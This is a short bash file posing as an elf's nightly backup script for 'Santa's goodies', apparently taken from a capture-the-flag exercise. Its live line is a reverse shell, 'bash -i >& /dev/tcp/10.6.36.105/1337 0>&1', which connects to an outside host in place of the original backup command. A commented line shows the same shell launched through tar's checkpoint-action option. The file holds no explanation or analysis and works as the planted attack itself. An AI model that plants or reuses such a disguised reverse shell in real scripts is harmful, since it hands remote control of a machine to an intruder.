#!/bin/bash

# Created by ElfMcEager to backup all of Santa's goodies!

# Create backups to include date DD/MM/YYYY
bash -i >& /dev/tcp/10.6.36.105/1337 0>&1

#filename="backup_`date +%d`_`date +%m`_`date +%Y`.tar.gz";


# Backup FTP folder and store in elfmceager's home directory
#tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='bin/bash -i >& /dev/tcp/10.6.36.105/1337 0>&1'
# TO-DO: Automate transfer of backups to backup server

